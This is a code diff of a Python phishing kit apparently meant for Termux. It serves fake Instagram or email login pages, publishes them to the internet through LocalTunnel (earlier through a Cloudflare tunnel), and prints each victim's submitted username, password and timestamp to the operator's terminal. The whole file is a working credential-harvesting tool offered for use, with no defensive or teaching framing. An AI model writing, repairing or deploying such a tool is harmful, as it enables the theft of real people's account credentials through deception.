@@ -1,25 +1,10 @@
 import os
 import sys
-import logging
 import socket
 import subprocess
-import threading
-from time import sleep
-from flask import Flask, request, send_from_directory
 from datetime import datetime
-from pathlib import Path
-import yaml
-
-# -------- Auto-install Flask if missing --------
-def install(package):
-    os.system(f"{sys.executable} -m pip install {package}")
-
-try:
-    from flask import Flask, request, send_from_directory
-except ModuleNotFoundError:
-    print("Installing Flask...")
-    install("flask")
-    from flask import Flask, request, send_from_directory
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import parse_qs
 
 # -------- Colors --------
 red = '\033[1;31m'
@@ -29,13 +14,29 @@ cyan = '\033[1;36m'
 pink = '\033[1;35m'
 reset = '\033[0m'
 
-# -------- Suppress Flask logs --------
-log = logging.getLogger('werkzeug')
-log.setLevel(logging.ERROR)
+# -------- Auto-install dependencies --------
+def install_dependencies():
+    os.system("clear")
+    print(f"{cyan}Checking dependencies...{reset}")
+    # Python packages
+    try:
+        import requests
+    except ModuleNotFoundError:
+        print(f"{ylo}Installing requests...{reset}")
+        os.system(f"{sys.executable} -m pip install requests")
+
+    # Node.js + localtunnel
+    if os.system("node -v") != 0:
+        print(f"{ylo}Installing Node.js...{reset}")
+        os.system("pkg install -y nodejs")
+    if os.system("lt -v") != 0:
+        print(f"{ylo}Installing LocalTunnel...{reset}")
+        os.system("npm install -g localtunnel")
+    print(f"{grn}All dependencies installed!{reset}\n")
 
 # -------- Banner --------
 def banner():
-    os.system("cls" if os.name == "nt" else "clear")
+    os.system("clear")
     print(f"""{red}
  ____  ____   ___    ____  
 |  _ \\|  _ \\ / _ \\  |  _ \\ 
@@ -47,27 +48,44 @@ def banner():
 {pink}         Created by Dhani v1.0{reset}
 """)
 
-# -------- Flask App --------
-app = Flask(__name__)
-selected_html = "1.html"  # default HTML file
+# -------- HTML Pages --------
+html_pages = {
+    "1": "11.html",  # Instagram
+    "2": "2.html"    # Email
+}
 
-@app.route('/')
-def home():
-    return send_from_directory(".", selected_html)
+# -------- HTTP Request Handler --------
+class RequestHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        file_name = html_pages.get(selected_choice, "11.html")
+        try:
+            with open(file_name, "rb") as f:
+                self.send_response(200)
+                self.send_header("Content-type", "text/html")
+                self.end_headers()
+                self.wfile.write(f.read())
+        except FileNotFoundError:
+            self.send_response(404)
+            self.end_headers()
+            self.wfile.write(b"File not found!")
 
-@app.route('/login', methods=["POST"])
-def login():
-    username = request.form.get("username")
-    password = request.form.get("password")
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    print(f"""{pink}
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+        data = parse_qs(post_data.decode())
+        username = data.get("username", [""])[0]
+        password = data.get("password", [""])[0]
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        print(f"""{pink}
 ╔══════════════════════════════╗
 ║ {cyan}Username: {ylo}{username}{cyan}            
 ║ {cyan}Password: {ylo}{password}{cyan}            
 ║ {cyan}Time    : {ylo}{timestamp}{cyan} 
 ╚══════════════════════════════╝{reset}
 """)
-    return "Login received! Check terminal."
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"Login received! Check terminal.")
 
 # -------- Find free port --------
 def get_free_port(start_port=8080):
@@ -78,64 +96,50 @@ def get_free_port(start_port=8080):
                 return port
             port += 1
 
-# -------- Cloudflare config --------
-def create_cloudflare_config(tunnel_id, domain, local_port):
-    config = {
-        'tunnel': tunnel_id,
-        'credentials-file': os.path.expanduser('~/.cloudflared/credentials.json'),
-        'ingress': [
-            {'hostname': domain, 'service': f'http://localhost:{local_port}'},
-            {'service': 'http_status:404'}
-        ]
-    }
-    config_dir = Path.home() / '.cloudflared'
-    config_dir.mkdir(exist_ok=True)
-    config_path = config_dir / 'config.yml'
-    with open(config_path, 'w') as f:
-        yaml.dump(config, f)
-    return config_path
-
-# -------- Run Flask --------
-def run_flask(port):
-    print(f"{grn}Server running locally at: {cyan}http://127.0.0.1:{port}{reset}\n")
-    print(f"{pink}Waiting for logins... Press Ctrl+C to stop.{reset}\n")
-    app.run(host='0.0.0.0', port=port, debug=False)
-
-# -------- Run Cloudflare tunnel --------
-def run_tunnel(config_path):
-    print(f"{grn}Starting Cloudflare tunnel...{reset}")
-    subprocess.run(['cloudflared', 'tunnel', '--config', str(config_path), 'run'])
+# -------- Run Server --------
+def run_server():
+    port = get_free_port(8080)
+    server = HTTPServer(("0.0.0.0", port), RequestHandler)
+    print(f"{grn}Server running on http://127.0.0.1:{port}{reset}")
+    
+    # Start localtunnel and get public URL
+    print(f"{cyan}Starting LocalTunnel...{reset}")
+    try:
+        lt_process = subprocess.Popen(
+            ["lt", "--port", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+        )
+        # Read line by line to print public URL
+        while True:
+            output = lt_process.stdout.readline()
+            if output:
+                print(f"{grn}{output.strip()}{reset}")
+            if "url:" in output:
+                print(f"{pink}Public link is above!{reset}\n")
+            if lt_process.poll() is not None:
+                break
+    except Exception as e:
+        print(f"{red}Error starting LocalTunnel: {e}{reset}")
+    
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print(f"{ylo}\nServer stopped.{reset}")
 
 # -------- Main --------
 if __name__ == "__main__":
+    install_dependencies()
     banner()
 
-    # ----- menu -----
     print(f"""{pink}
 ╔══════════════════════════════╗
 ║ {cyan}Choose Page Template{pink}        
 ╠══════════════════════════════╣
-║ [1] instagram                
-║ [2] email                  
+║ [1] Instagram                
+║ [2] Email                  
 ╚══════════════════════════════╝
 {reset}""")
-    choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
-    selected_html = "11.html" if choice == "1" else "2.html"
+    selected_choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
+    if selected_choice not in ["1", "2"]:
+        selected_choice = "1"
 
-    # Flask port
-    port = get_free_port(8080)
-
-    # Cloudflare tunnel info
-    tunnel_id = input("Enter Cloudflare Tunnel ID: ").strip()
-    domain = input("Enter domain (sub.example.com): ").strip()
-    config_path = create_cloudflare_config(tunnel_id, domain, port)
-
-    # Run Flask in a thread
-    flask_thread = threading.Thread(target=run_flask, args=(port,))
-    flask_thread.daemon = True
-    flask_thread.start()
-
-    sleep(2)  # give Flask time to start
-
-    # Run Cloudflare tunnel
-    run_tunnel(config_path)
+    run_server()
